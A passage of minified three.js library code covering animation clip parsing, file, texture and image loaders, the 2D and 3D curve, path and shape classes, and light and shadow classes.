a=[],o=[];pl.flattenJSON(i,a,o,n),0!==a.length&&r.push(new t(e,a,o))}},n=[],r=t.name||"default",a=t.length||-1,o=t.fps||30;t=t.hierarchy||[];for(var s=0;s<t.length;s++){var l=t[s].keys;if(l&&0!==l.length)if(l[0].morphTargets){a={};for(var c=0;c<l.length;c++)if(l[c].morphTargets)for(var h=0;h<l[c].morphTargets.length;h++)a[l[c].morphTargets[h]]=-1;for(var u in a){var d=[],p=[];for(h=0;h!==l[c].morphTargets.length;++h){var f=l[c];d.push(f.time),p.push(f.morphTarget===u?1:0)}n.push(new An(".morphTargetInfluence["+u+"]",d,p))}a=a.length*(o||1)}else i(On,(c=".bones["+e[s].name+"]")+".position",l,"pos",n),i(Pn,c+".quaternion",l,"rot",n),i(On,c+".scale",l,"scl",n)}return 0===n.length?null:new In(r,a,n)}}),Object.assign(In.prototype,{resetDuration:function(){for(var t=0,e=0,i=this.tracks.length;e!==i;++e){var n=this.tracks[e];t=Math.max(t,n.times[n.times.length-1])}return this.duration=t,this},trim:function(){for(var t=0;t<this.tracks.length;t++)this.tracks[t].trim(0,this.duration);return this},validate:function(){for(var t=!0,e=0;e<this.tracks.length;e++)t=t&&this.tracks[e].validate();return t},optimize:function(){for(var t=0;t<this.tracks.length;t++)this.tracks[t].optimize();return this},clone:function(){for(var t=[],e=0;e<this.tracks.length;e++)t.push(this.tracks[e].clone());return new In(this.name,this.duration,t)}});var fl={enabled:!1,files:{},add:function(t,e){!1!==this.enabled&&(this.files[t]=e)},get:function(t){if(!1!==this.enabled)return this.files[t]},remove:function(t){delete this.files[t]},clear:function(){this.files={}}},ml=new Dn;Object.assign(Nn.prototype,{load:function(){},parse:function(){},setCrossOrigin:function(t){return this.crossOrigin=t,this},setPath:function(t){return this.path=t,this},setResourcePath:function(t){return this.resourcePath=t,this}}),Nn.Handlers={handlers:[],add:function(t,e){this.handlers.push(t,e)},get:function(t){for(var e=this.handlers,i=0,n=e.length;i<n;i+=2){var r=e[i+1];if(e[i].test(t))return r}return null}};var gl={};kn.prototype=Object.assign(Object.create(Nn.prototype),{constructor:kn,load:function(t,e,i,n){void 0===t&&(t=""),void 0!==this.path&&(t=this.path+t),t=this.manager.resolveURL(t);var r=this,a=fl.get(t);if(void 0!==a)return r.manager.itemStart(t),setTimeout((function(){e&&e(a),r.manager.itemEnd(t)}),0),a;if(void 0===gl[t]){var o=t.match(/^data:(.*?)(;base64)?,(.*)$/);if(o){i=o[1];var s=!!o[2];o=o[3],o=decodeURIComponent(o),s&&(o=atob(o));try{var l=(this.responseType||"").toLowerCase();switch(l){case"arraybuffer":case"blob":var c=new Uint8Array(o.length);for(s=0;s<o.length;s++)c[s]=o.charCodeAt(s);var h="blob"===l?new Blob([c.buffer],{type:i}):c.buffer;break;case"document":h=(new DOMParser).parseFromString(o,i);break;case"json":h=JSON.parse(o);break;default:h=o}setTimeout((function(){e&&e(h),r.manager.itemEnd(t)}),0)}catch(e){setTimeout((function(){n&&n(e),r.manager.itemError(t),r.manager.itemEnd(t)}),0)}}else{gl[t]=[],gl[t].push({onLoad:e,onProgress:i,onError:n});var u=new XMLHttpRequest;for(s in u.open("GET",t,!0),u.addEventListener("load",(function(e){var i=this.response;fl.add(t,i);var n=gl[t];if(delete gl[t],200===this.status||0===this.status){0===this.status&&console.warn("THREE.FileLoader: HTTP Status 0 received.");for(var a=0,o=n.length;a<o;a++){var s=n[a];s.onLoad&&s.onLoad(i)}}else{for(a=0,o=n.length;a<o;a++)(s=n[a]).onError&&s.onError(e);r.manager.itemError(t)}r.manager.itemEnd(t)}),!1),u.addEventListener("progress",(function(e){for(var i=gl[t],n=0,r=i.length;n<r;n++){var a=i[n];a.onProgress&&a.onProgress(e)}}),!1),u.addEventListener("error",(function(e){var i=gl[t];delete gl[t];for(var n=0,a=i.length;n<a;n++){var o=i[n];o.onError&&o.onError(e)}r.manager.itemError(t),r.manager.itemEnd(t)}),!1),u.addEventListener("abort",(function(e){var i=gl[t];delete gl[t];for(var n=0,a=i.length;n<a;n++){var o=i[n];o.onError&&o.onError(e)}r.manager.itemError(t),r.manager.itemEnd(t)}),!1),void 0!==this.responseType&&(u.responseType=this.responseType),void 0!==this.withCredentials&&(u.withCredentials=this.withCredentials),u.overrideMimeType&&u.overrideMimeType(void 0!==this.mimeType?this.mimeType:"text/plain"),this.requestHeader)u.setRequestHeader(s,this.requestHeader[s]);u.send(null)}return r.manager.itemStart(t),u}gl[t].push({onLoad:e,onProgress:i,onError:n})},setResponseType:function(t){return this.responseType=t,this},setWithCredentials:function(t){return this.withCredentials=t,this},setMimeType:function(t){return this.mimeType=t,this},setRequestHeader:function(t){return this.requestHeader=t,this}}),Bn.prototype=Object.assign(Object.create(Nn.prototype),{constructor:Bn,load:function(t,e,i,n){var r=this,a=new kn(r.manager);a.setPath(r.path),a.load(t,(function(t){e(r.parse(JSON.parse(t)))}),i,n)},parse:function(t){for(var e=[],i=0;i<t.length;i++){var n=In.parse(t[i]);e.push(n)}return e}}),Fn.prototype=Object.assign(Object.create(Nn.prototype),{constructor:Fn,load:function(t,e,i,n){function r(r){l.load(t[r],(function(t){t=a._parser(t,!0),o[r]={width:t.width,height:t.height,format:t.format,mipmaps:t.mipmaps},6===(c+=1)&&(1===t.mipmapCount&&(s.minFilter=1006),s.format=t.format,s.needsUpdate=!0,e&&e(s))}),i,n)}var a=this,o=[],s=new ii;s.image=o;var l=new kn(this.manager);if(l.setPath(this.path),l.setResponseType("arraybuffer"),Array.isArray(t))for(var c=0,h=0,u=t.length;h<u;++h)r(h);else l.load(t,(function(t){if((t=a._parser(t,!0)).isCubemap)for(var i=t.mipmaps.length/t.mipmapCount,n=0;n<i;n++){o[n]={mipmaps:[]};for(var r=0;r<t.mipmapCount;r++)o[n].mipmaps.push(t.mipmaps[n*t.mipmapCount+r]),o[n].format=t.format,o[n].width=t.width,o[n].height=t.height}else s.image.width=t.width,s.image.height=t.height,s.mipmaps=t.mipmaps;1===t.mipmapCount&&(s.minFilter=1006),s.format=t.format,s.needsUpdate=!0,e&&e(s)}),i,n);return s}}),Hn.prototype=Object.assign(Object.create(Nn.prototype),{constructor:Hn,load:function(t,e,i,n){var r=this,a=new Q,o=new kn(this.manager);return o.setResponseType("arraybuffer"),o.setPath(this.path),o.load(t,(function(t){(t=r._parser(t))&&(void 0!==t.image?a.image=t.image:void 0!==t.data&&(a.image.width=t.width,a.image.height=t.height,a.image.data=t.data),a.wrapS=void 0!==t.wrapS?t.wrapS:1001,a.wrapT=void 0!==t.wrapT?t.wrapT:1001,a.magFilter=void 0!==t.magFilter?t.magFilter:1006,a.minFilter=void 0!==t.minFilter?t.minFilter:1008,a.anisotropy=void 0!==t.anisotropy?t.anisotropy:1,void 0!==t.format&&(a.format=t.format),void 0!==t.type&&(a.type=t.type),void 0!==t.mipmaps&&(a.mipmaps=t.mipmaps),1===t.mipmapCount&&(a.minFilter=1006),a.needsUpdate=!0,e&&e(a,t))}),i,n),a}}),Gn.prototype=Object.assign(Object.create(Nn.prototype),{constructor:Gn,load:function(t,e,i,n){function r(){l.removeEventListener("load",r,!1),l.removeEventListener("error",a,!1),fl.add(t,this),e&&e(this),o.manager.itemEnd(t)}function a(e){l.removeEventListener("load",r,!1),l.removeEventListener("error",a,!1),n&&n(e),o.manager.itemError(t),o.manager.itemEnd(t)}void 0!==this.path&&(t=this.path+t),t=this.manager.resolveURL(t);var o=this,s=fl.get(t);if(void 0!==s)return o.manager.itemStart(t),setTimeout((function(){e&&e(s),o.manager.itemEnd(t)}),0),s;var l=document.createElementNS("http://www.w3.org/1999/xhtml","img");return l.addEventListener("load",r,!1),l.addEventListener("error",a,!1),"data:"!==t.substr(0,5)&&void 0!==this.crossOrigin&&(l.crossOrigin=this.crossOrigin),o.manager.itemStart(t),l.src=t,l}}),jn.prototype=Object.assign(Object.create(Nn.prototype),{constructor:jn,load:function(t,e,i,n){function r(i){o.load(t[i],(function(t){a.images[i]=t,6===++s&&(a.needsUpdate=!0,e&&e(a))}),void 0,n)}var a=new vt,o=new Gn(this.manager);o.setCrossOrigin(this.crossOrigin),o.setPath(this.path);var s=0;for(i=0;i<t.length;++i)r(i);return a}}),Un.prototype=Object.assign(Object.create(Nn.prototype),{constructor:Un,load:function(t,e,i,n){var r=new o,a=new Gn(this.manager);return a.setCrossOrigin(this.crossOrigin),a.setPath(this.path),a.load(t,(function(i){r.image=i,i=0<t.search(/\.jpe?g($|\?)/i)||0===t.search(/^data:image\/jpeg/),r.format=i?1022:1023,r.needsUpdate=!0,void 0!==e&&e(r)}),i,n),r}}),Object.assign(Vn.prototype,{getPoint:function(){return console.warn("THREE.Curve: .getPoint() not implemented."),null},getPointAt:function(t,e){return t=this.getUtoTmapping(t),this.getPoint(t,e)},getPoints:function(t){void 0===t&&(t=5);for(var e=[],i=0;i<=t;i++)e.push(this.getPoint(i/t));return e},getSpacedPoints:function(t){void 0===t&&(t=5);for(var e=[],i=0;i<=t;i++)e.push(this.getPointAt(i/t));return e},getLength:function(){var t=this.getLengths();return t[t.length-1]},getLengths:function(t){if(void 0===t&&(t=this.arcLengthDivisions),this.cacheArcLengths&&this.cacheArcLengths.length===t+1&&!this.needsUpdate)return this.cacheArcLengths;this.needsUpdate=!1;var e,i=[],n=this.getPoint(0),r=0;for(i.push(0),e=1;e<=t;e++){var a=this.getPoint(e/t);r+=a.distanceTo(n),i.push(r),n=a}return this.cacheArcLengths=i},updateArcLengths:function(){this.needsUpdate=!0,this.getLengths()},getUtoTmapping:function(t,e){var i=this.getLengths(),n=i.length;e=e||t*i[n-1];for(var r,a=0,o=n-1;a<=o;)if(0>(r=i[t=Math.floor(a+(o-a)/2)]-e))a=t+1;else{if(!(0<r)){o=t;break}o=t-1}return i[t=o]===e?t/(n-1):(t+(e-(a=i[t]))/(i[t+1]-a))/(n-1)},getTangent:function(t){var e=t-1e-4;return 0>e&&(e=0),1<(t+=1e-4)&&(t=1),e=this.getPoint(e),this.getPoint(t).clone().sub(e).normalize()},getTangentAt:function(t){return t=this.getUtoTmapping(t),this.getTangent(t)},computeFrenetFrames:function(t,e){var i,n=new r,a=[],o=[],s=[],l=new r,c=new h;for(i=0;i<=t;i++){var u=i/t;a[i]=this.getTangentAt(u),a[i].normalize()}o[0]=new r,s[0]=new r,i=Number.MAX_VALUE,u=Math.abs(a[0].x);var d=Math.abs(a[0].y),p=Math.abs(a[0].z);for(u<=i&&(i=u,n.set(1,0,0)),d<=i&&(i=d,n.set(0,1,0)),p<=i&&n.set(0,0,1),l.crossVectors(a[0],n).normalize(),o[0].crossVectors(a[0],l),s[0].crossVectors(a[0],o[0]),i=1;i<=t;i++)o[i]=o[i-1].clone(),s[i]=s[i-1].clone(),l.crossVectors(a[i-1],a[i]),l.length()>Number.EPSILON&&(l.normalize(),n=Math.acos(Ca.clamp(a[i-1].dot(a[i]),-1,1)),o[i].applyMatrix4(c.makeRotationAxis(l,n))),s[i].crossVectors(a[i],o[i]);if(!0===e)for(n=Math.acos(Ca.clamp(o[0].dot(o[t]),-1,1)),n/=t,0<a[0].dot(l.crossVectors(o[0],o[t]))&&(n=-n),i=1;i<=t;i++)o[i].applyMatrix4(c.makeRotationAxis(a[i],n*i)),s[i].crossVectors(a[i],o[i]);return{tangents:a,normals:o,binormals:s}},clone:function(){return(new this.constructor).copy(this)},copy:function(t){return this.arcLengthDivisions=t.arcLengthDivisions,this},toJSON:function(){var t={metadata:{version:4.5,type:"Curve",generator:"Curve.toJSON"}};return t.arcLengthDivisions=this.arcLengthDivisions,t.type=this.type,t},fromJSON:function(t){return this.arcLengthDivisions=t.arcLengthDivisions,this}}),Wn.prototype=Object.create(Vn.prototype),Wn.prototype.constructor=Wn,Wn.prototype.isEllipseCurve=!0,Wn.prototype.getPoint=function(t,e){e=e||new i;for(var n=2*Math.PI,r=this.aEndAngle-this.aStartAngle,a=Math.abs(r)<Number.EPSILON;0>r;)r+=n;for(;r>n;)r-=n;r<Number.EPSILON&&(r=a?0:n),!0!==this.aClockwise||a||(r=r===n?-n:r-n),n=this.aStartAngle+t*r,t=this.aX+this.xRadius*Math.cos(n);var o=this.aY+this.yRadius*Math.sin(n);return 0!==this.aRotation&&(n=Math.cos(this.aRotation),r=Math.sin(this.aRotation),t=(a=t-this.aX)*n-(o-=this.aY)*r+this.aX,o=a*r+o*n+this.aY),e.set(t,o)},Wn.prototype.copy=function(t){return Vn.prototype.copy.call(this,t),this.aX=t.aX,this.aY=t.aY,this.xRadius=t.xRadius,this.yRadius=t.yRadius,this.aStartAngle=t.aStartAngle,this.aEndAngle=t.aEndAngle,this.aClockwise=t.aClockwise,this.aRotation=t.aRotation,this},Wn.prototype.toJSON=function(){var t=Vn.prototype.toJSON.call(this);return t.aX=this.aX,t.aY=this.aY,t.xRadius=this.xRadius,t.yRadius=this.yRadius,t.aStartAngle=this.aStartAngle,t.aEndAngle=this.aEndAngle,t.aClockwise=this.aClockwise,t.aRotation=this.aRotation,t},Wn.prototype.fromJSON=function(t){return Vn.prototype.fromJSON.call(this,t),this.aX=t.aX,this.aY=t.aY,this.xRadius=t.xRadius,this.yRadius=t.yRadius,this.aStartAngle=t.aStartAngle,this.aEndAngle=t.aEndAngle,this.aClockwise=t.aClockwise,this.aRotation=t.aRotation,this},qn.prototype=Object.create(Wn.prototype),qn.prototype.constructor=qn,qn.prototype.isArcCurve=!0;var vl=new r,yl=new Xn,xl=new Xn,bl=new Xn;Yn.prototype=Object.create(Vn.prototype),Yn.prototype.constructor=Yn,Yn.prototype.isCatmullRomCurve3=!0,Yn.prototype.getPoint=function(t,e){e=e||new r;var i=this.points,n=i.length;t*=n-(this.closed?0:1);var a=Math.floor(t);if(t-=a,this.closed?a+=0<a?0:(Math.floor(Math.abs(a)/n)+1)*n:0===t&&a===n-1&&(a=n-2,t=1),this.closed||0<a)var o=i[(a-1)%n];else vl.subVectors(i[0],i[1]).add(i[0]),o=vl;var s=i[a%n],l=i[(a+1)%n];if(this.closed||a+2<n?i=i[(a+2)%n]:(vl.subVectors(i[n-1],i[n-2]).add(i[n-1]),i=vl),"centripetal"===this.curveType||"chordal"===this.curveType){var c="chordal"===this.curveType?.5:.25;n=Math.pow(o.distanceToSquared(s),c),1e-4>(a=Math.pow(s.distanceToSquared(l),c))&&(a=1),1e-4>n&&(n=a),1e-4>(c=Math.pow(l.distanceToSquared(i),c))&&(c=a),yl.initNonuniformCatmullRom(o.x,s.x,l.x,i.x,n,a,c),xl.initNonuniformCatmullRom(o.y,s.y,l.y,i.y,n,a,c),bl.initNonuniformCatmullRom(o.z,s.z,l.z,i.z,n,a,c)}else"catmullrom"===this.curveType&&(yl.initCatmullRom(o.x,s.x,l.x,i.x,this.tension),xl.initCatmullRom(o.y,s.y,l.y,i.y,this.tension),bl.initCatmullRom(o.z,s.z,l.z,i.z,this.tension));return e.set(yl.calc(t),xl.calc(t),bl.calc(t)),e},Yn.prototype.copy=function(t){Vn.prototype.copy.call(this,t),this.points=[];for(var e=0,i=t.points.length;e<i;e++)this.points.push(t.points[e].clone());return this.closed=t.closed,this.curveType=t.curveType,this.tension=t.tension,this},Yn.prototype.toJSON=function(){var t=Vn.prototype.toJSON.call(this);t.points=[];for(var e=0,i=this.points.length;e<i;e++)t.points.push(this.points[e].toArray());return t.closed=this.closed,t.curveType=this.curveType,t.tension=this.tension,t},Yn.prototype.fromJSON=function(t){Vn.prototype.fromJSON.call(this,t),this.points=[];for(var e=0,i=t.points.length;e<i;e++){var n=t.points[e];this.points.push((new r).fromArray(n))}return this.closed=t.closed,this.curveType=t.curveType,this.tension=t.tension,this},Kn.prototype=Object.create(Vn.prototype),Kn.prototype.constructor=Kn,Kn.prototype.isCubicBezierCurve=!0,Kn.prototype.getPoint=function(t,e){e=e||new i;var n=this.v0,r=this.v1,a=this.v2,o=this.v3;return e.set(Jn(t,n.x,r.x,a.x,o.x),Jn(t,n.y,r.y,a.y,o.y)),e},Kn.prototype.copy=function(t){return Vn.prototype.copy.call(this,t),this.v0.copy(t.v0),this.v1.copy(t.v1),this.v2.copy(t.v2),this.v3.copy(t.v3),this},Kn.prototype.toJSON=function(){var t=Vn.prototype.toJSON.call(this);return t.v0=this.v0.toArray(),t.v1=this.v1.toArray(),t.v2=this.v2.toArray(),t.v3=this.v3.toArray(),t},Kn.prototype.fromJSON=function(t){return Vn.prototype.fromJSON.call(this,t),this.v0.fromArray(t.v0),this.v1.fromArray(t.v1),this.v2.fromArray(t.v2),this.v3.fromArray(t.v3),this},Qn.prototype=Object.create(Vn.prototype),Qn.prototype.constructor=Qn,Qn.prototype.isCubicBezierCurve3=!0,Qn.prototype.getPoint=function(t,e){e=e||new r;var i=this.v0,n=this.v1,a=this.v2,o=this.v3;return e.set(Jn(t,i.x,n.x,a.x,o.x),Jn(t,i.y,n.y,a.y,o.y),Jn(t,i.z,n.z,a.z,o.z)),e},Qn.prototype.copy=function(t){return Vn.prototype.copy.call(this,t),this.v0.copy(t.v0),this.v1.copy(t.v1),this.v2.copy(t.v2),this.v3.copy(t.v3),this},Qn.prototype.toJSON=function(){var t=Vn.prototype.toJSON.call(this);return t.v0=this.v0.toArray(),t.v1=this.v1.toArray(),t.v2=this.v2.toArray(),t.v3=this.v3.toArray(),t},Qn.prototype.fromJSON=function(t){return Vn.prototype.fromJSON.call(this,t),this.v0.fromArray(t.v0),this.v1.fromArray(t.v1),this.v2.fromArray(t.v2),this.v3.fromArray(t.v3),this},tr.prototype=Object.create(Vn.prototype),tr.prototype.constructor=tr,tr.prototype.isLineCurve=!0,tr.prototype.getPoint=function(t,e){return e=e||new i,1===t?e.copy(this.v2):(e.copy(this.v2).sub(this.v1),e.multiplyScalar(t).add(this.v1)),e},tr.prototype.getPointAt=function(t,e){return this.getPoint(t,e)},tr.prototype.getTangent=function(){return this.v2.clone().sub(this.v1).normalize()},tr.prototype.copy=function(t){return Vn.prototype.copy.call(this,t),this.v1.copy(t.v1),this.v2.copy(t.v2),this},tr.prototype.toJSON=function(){var t=Vn.prototype.toJSON.call(this);return t.v1=this.v1.toArray(),t.v2=this.v2.toArray(),t},tr.prototype.fromJSON=function(t){return Vn.prototype.fromJSON.call(this,t),this.v1.fromArray(t.v1),this.v2.fromArray(t.v2),this},er.prototype=Object.create(Vn.prototype),er.prototype.constructor=er,er.prototype.isLineCurve3=!0,er.prototype.getPoint=function(t,e){return e=e||new r,1===t?e.copy(this.v2):(e.copy(this.v2).sub(this.v1),e.multiplyScalar(t).add(this.v1)),e},er.prototype.getPointAt=function(t,e){return this.getPoint(t,e)},er.prototype.copy=function(t){return Vn.prototype.copy.call(this,t),this.v1.copy(t.v1),this.v2.copy(t.v2),this},er.prototype.toJSON=function(){var t=Vn.prototype.toJSON.call(this);return t.v1=this.v1.toArray(),t.v2=this.v2.toArray(),t},er.prototype.fromJSON=function(t){return Vn.prototype.fromJSON.call(this,t),this.v1.fromArray(t.v1),this.v2.fromArray(t.v2),this},ir.prototype=Object.create(Vn.prototype),ir.prototype.constructor=ir,ir.prototype.isQuadraticBezierCurve=!0,ir.prototype.getPoint=function(t,e){e=e||new i;var n=this.v0,r=this.v1,a=this.v2;return e.set(Zn(t,n.x,r.x,a.x),Zn(t,n.y,r.y,a.y)),e},ir.prototype.copy=function(t){return Vn.prototype.copy.call(this,t),this.v0.copy(t.v0),this.v1.copy(t.v1),this.v2.copy(t.v2),this},ir.prototype.toJSON=function(){var t=Vn.prototype.toJSON.call(this);return t.v0=this.v0.toArray(),t.v1=this.v1.toArray(),t.v2=this.v2.toArray(),t},ir.prototype.fromJSON=function(t){return Vn.prototype.fromJSON.call(this,t),this.v0.fromArray(t.v0),this.v1.fromArray(t.v1),this.v2.fromArray(t.v2),this},nr.prototype=Object.create(Vn.prototype),nr.prototype.constructor=nr,nr.prototype.isQuadraticBezierCurve3=!0,nr.prototype.getPoint=function(t,e){e=e||new r;var i=this.v0,n=this.v1,a=this.v2;return e.set(Zn(t,i.x,n.x,a.x),Zn(t,i.y,n.y,a.y),Zn(t,i.z,n.z,a.z)),e},nr.prototype.copy=function(t){return Vn.prototype.copy.call(this,t),this.v0.copy(t.v0),this.v1.copy(t.v1),this.v2.copy(t.v2),this},nr.prototype.toJSON=function(){var t=Vn.prototype.toJSON.call(this);return t.v0=this.v0.toArray(),t.v1=this.v1.toArray(),t.v2=this.v2.toArray(),t},nr.prototype.fromJSON=function(t){return Vn.prototype.fromJSON.call(this,t),this.v0.fromArray(t.v0),this.v1.fromArray(t.v1),this.v2.fromArray(t.v2),this},rr.prototype=Object.create(Vn.prototype),rr.prototype.constructor=rr,rr.prototype.isSplineCurve=!0,rr.prototype.getPoint=function(t,e){e=e||new i;var n=this.points,r=(n.length-1)*t;r-=t=Math.floor(r);var a=n[0===t?t:t-1],o=n[t],s=n[t>n.length-2?n.length-1:t+1];return n=n[t>n.length-3?n.length-1:t+2],e.set($n(r,a.x,o.x,s.x,n.x),$n(r,a.y,o.y,s.y,n.y)),e},rr.prototype.copy=function(t){Vn.prototype.copy.call(this,t),this.points=[];for(var e=0,i=t.points.length;e<i;e++)this.points.push(t.points[e].clone());return this},rr.prototype.toJSON=function(){var t=Vn.prototype.toJSON.call(this);t.points=[];for(var e=0,i=this.points.length;e<i;e++)t.points.push(this.points[e].toArray());return t},rr.prototype.fromJSON=function(t){Vn.prototype.fromJSON.call(this,t),this.points=[];for(var e=0,n=t.points.length;e<n;e++){var r=t.points[e];this.points.push((new i).fromArray(r))}return this};var wl=Object.freeze({ArcCurve:qn,CatmullRomCurve3:Yn,CubicBezierCurve:Kn,CubicBezierCurve3:Qn,EllipseCurve:Wn,LineCurve:tr,LineCurve3:er,QuadraticBezierCurve:ir,QuadraticBezierCurve3:nr,SplineCurve:rr});ar.prototype=Object.assign(Object.create(Vn.prototype),{constructor:ar,add:function(t){this.curves.push(t)},closePath:function(){var t=this.curves[0].getPoint(0),e=this.curves[this.curves.length-1].getPoint(1);t.equals(e)||this.curves.push(new tr(e,t))},getPoint:function(t){var e=t*this.getLength(),i=this.getCurveLengths();for(t=0;t<i.length;){if(i[t]>=e)return e=i[t]-e,i=(t=this.curves[t]).getLength(),t.getPointAt(0===i?0:1-e/i);t++}return null},getLength:function(){var t=this.getCurveLengths();return t[t.length-1]},updateArcLengths:function(){this.needsUpdate=!0,this.cacheLengths=null,this.getCurveLengths()},getCurveLengths:function(){if(this.cacheLengths&&this.cacheLengths.length===this.curves.length)return this.cacheLengths;for(var t=[],e=0,i=0,n=this.curves.length;i<n;i++)e+=this.curves[i].getLength(),t.push(e);return this.cacheLengths=t},getSpacedPoints:function(t){void 0===t&&(t=40);for(var e=[],i=0;i<=t;i++)e.push(this.getPoint(i/t));return this.autoClose&&e.push(e[0]),e},getPoints:function(t){t=t||12;for(var e,i=[],n=0,r=this.curves;n<r.length;n++){var a=r[n];a=a.getPoints(a&&a.isEllipseCurve?2*t:a&&(a.isLineCurve||a.isLineCurve3)?1:a&&a.isSplineCurve?t*a.points.length:t);for(var o=0;o<a.length;o++){var s=a[o];e&&e.equals(s)||(i.push(s),e=s)}}return this.autoClose&&1<i.length&&!i[i.length-1].equals(i[0])&&i.push(i[0]),i},copy:function(t){Vn.prototype.copy.call(this,t),this.curves=[];for(var e=0,i=t.curves.length;e<i;e++)this.curves.push(t.curves[e].clone());return this.autoClose=t.autoClose,this},toJSON:function(){var t=Vn.prototype.toJSON.call(this);t.autoClose=this.autoClose,t.curves=[];for(var e=0,i=this.curves.length;e<i;e++)t.curves.push(this.curves[e].toJSON());return t},fromJSON:function(t){Vn.prototype.fromJSON.call(this,t),this.autoClose=t.autoClose,this.curves=[];for(var e=0,i=t.curves.length;e<i;e++){var n=t.curves[e];this.curves.push((new wl[n.type]).fromJSON(n))}return this}}),or.prototype=Object.assign(Object.create(ar.prototype),{constructor:or,setFromPoints:function(t){this.moveTo(t[0].x,t[0].y);for(var e=1,i=t.length;e<i;e++)this.lineTo(t[e].x,t[e].y)},moveTo:function(t,e){this.currentPoint.set(t,e)},lineTo:function(t,e){var n=new tr(this.currentPoint.clone(),new i(t,e));this.curves.push(n),this.currentPoint.set(t,e)},quadraticCurveTo:function(t,e,n,r){t=new ir(this.currentPoint.clone(),new i(t,e),new i(n,r)),this.curves.push(t),this.currentPoint.set(n,r)},bezierCurveTo:function(t,e,n,r,a,o){t=new Kn(this.currentPoint.clone(),new i(t,e),new i(n,r),new i(a,o)),this.curves.push(t),this.currentPoint.set(a,o)},splineThru:function(t){var e=[this.currentPoint.clone()].concat(t);e=new rr(e),this.curves.push(e),this.currentPoint.copy(t[t.length-1])},arc:function(t,e,i,n,r,a){this.absarc(t+this.currentPoint.x,e+this.currentPoint.y,i,n,r,a)},absarc:function(t,e,i,n,r,a){this.absellipse(t,e,i,i,n,r,a)},ellipse:function(t,e,i,n,r,a,o,s){this.absellipse(t+this.currentPoint.x,e+this.currentPoint.y,i,n,r,a,o,s)},absellipse:function(t,e,i,n,r,a,o,s){t=new Wn(t,e,i,n,r,a,o,s),0<this.curves.length&&((e=t.getPoint(0)).equals(this.currentPoint)||this.lineTo(e.x,e.y)),this.curves.push(t),t=t.getPoint(1),this.currentPoint.copy(t)},copy:function(t){return ar.prototype.copy.call(this,t),this.currentPoint.copy(t.currentPoint),this},toJSON:function(){var t=ar.prototype.toJSON.call(this);return t.currentPoint=this.currentPoint.toArray(),t},fromJSON:function(t){return ar.prototype.fromJSON.call(this,t),this.currentPoint.fromArray(t.currentPoint),this}}),sr.prototype=Object.assign(Object.create(or.prototype),{constructor:sr,getPointsHoles:function(t){for(var e=[],i=0,n=this.holes.length;i<n;i++)e[i]=this.holes[i].getPoints(t);return e},extractPoints:function(t){return{shape:this.getPoints(t),holes:this.getPointsHoles(t)}},copy:function(t){or.prototype.copy.call(this,t),this.holes=[];for(var e=0,i=t.holes.length;e<i;e++)this.holes.push(t.holes[e].clone());return this},toJSON:function(){var t=or.prototype.toJSON.call(this);t.uuid=this.uuid,t.holes=[];for(var e=0,i=this.holes.length;e<i;e++)t.holes.push(this.holes[e].toJSON());return t},fromJSON:function(t){or.prototype.fromJSON.call(this,t),this.uuid=t.uuid,this.holes=[];for(var e=0,i=t.holes.length;e<i;e++){var n=t.holes[e];this.holes.push((new or).fromJSON(n))}return this}}),lr.prototype=Object.assign(Object.create(p.prototype),{constructor:lr,isLight:!0,copy:function(t){return p.prototype.copy.call(this,t),this.color.copy(t.color),this.intensity=t.intensity,this},toJSON:function(t){return(t=p.prototype.toJSON.call(this,t)).object.color=this.color.getHex(),t.object.intensity=this.intensity,void 0!==this.groundColor&&(t.object.groundColor=this.groundColor.getHex()),void 0!==this.distance&&(t.object.distance=this.distance),void 0!==this.angle&&(t.object.angle=this.angle),void 0!==this.decay&&(t.object.decay=this.decay),void 0!==this.penumbra&&(t.object.penumbra=this.penumbra),void 0!==this.shadow&&(t.object.shadow=this.shadow.toJSON()),t}}),cr.prototype=Object.assign(Object.create(lr.prototype),{constructor:cr,isHemisphereLight:!0,copy:function(t){return lr.prototype.copy.call(this,t),this.groundColor.copy(t.groundColor),this}}),Object.assign(hr.prototype,{_projScreenMatrix:new h,_lightPositionWorld:new r,_lookTarget:new r,getViewportCount:function(){return this._viewportCount},getFrustum:function(){return this._frustum},updateMatrices:function(t){var e=this.camera,i=this.matrix,n=this._projScreenMatrix,r=this._lookTarget,a=this._lightPositionWorld;a.setFromMatrixPosition(t.matrixWorld),e.position.copy(a),r.setFromMatrixPosition(t.target.matrixWorld),e.lookAt(r),e.updateMatrixWorld(),n.multiplyMatrices(e.projectionMatrix,e.matrixWorldInverse),this._frustum.setFromMatrix(n),i.set(.5,0,0,.5,0,.5,0,.5,0,0,.5,.5,0,0,0,1),i.multiply(e.projectionMatrix),i.multiply(e.matrixWorldInverse)},getViewport:function(t){return this._viewports[t]},getFrameExtents:function(){return this._frameExtents},copy:function(t){return this.camera=t.camera.clone(),this.bias=t.bias,this.radius=t.radius,this.mapSize.copy(t.mapSize),this},clone:function(){return(new this.constructor).copy(this)},toJSON:function(){var t={};return 0!==this.bias&&(t.bias=this.bias),1!==this.radius&&(t.radius=this.radius),512===this.mapSize.x&&512===this.mapSize.y||(t.mapSize=this.mapSize.toArray()),t.camera=this.camera.toJSON(!1).object,delete t.camera.matrix,t}}),ur.prototype=Object.assign(Object.create(hr.prototype),{constructor:ur,isSpotLightShadow:!0,updateMatrices:function(t,e,i){var n=this.camera,r=2*Ca.RAD2DEG*t.angle,a=this.mapSize.width/this.mapSize.height,o=t.distance||n.far;r===n.fov&&a===n.aspect&&o===n.far||(n.fov=r,n.aspect=a,n.far=o,n.updateProjectionMatrix()),hr.prototype.updateMatrices.call(this,t,e,i)}}),dr.prototype=Object.assign(Object.create(lr.prototype),{constructor:dr,isSpotLight:!0,copy:function(t){return lr.prototype.copy.call(this,t),this.distance=t.distance,this.angle=t.angle,this.penumbra=t.penumbra,this.decay=t.decay,this.target=t.target.clone(),this.shadow=t.shadow.clone(),this}}),pr.prototype=Object.assign(Object.create(hr.prototype),{constructor:pr,isPointLightShadow:!0,updateMatrices:function(t,e,i){e=this.camera;var n=this.matrix,r=this._lightPositionWorld,a=this._lookTarget,o=this._projScreenMatrix;r.setFromMatrixPosition(t.matrixWorld),e.position.copy(r),a.copy(e.position),a.add(this._cubeDirections[i]),e.up.copy(this._cubeUps[i]),e.lookAt(a),e.updateMatrixWorld(),n.makeTranslation(-r.x,-r.y,-r.z),o.multiplyMatrices(e.projectionMatrix,e.matrixWorldInverse),this._frustum.setFromMatrix(o)}}),fr.prototype=Object.assign(Object.create(lr.prototype),{constructor:fr,isPointLight:!0,copy:function(t){return 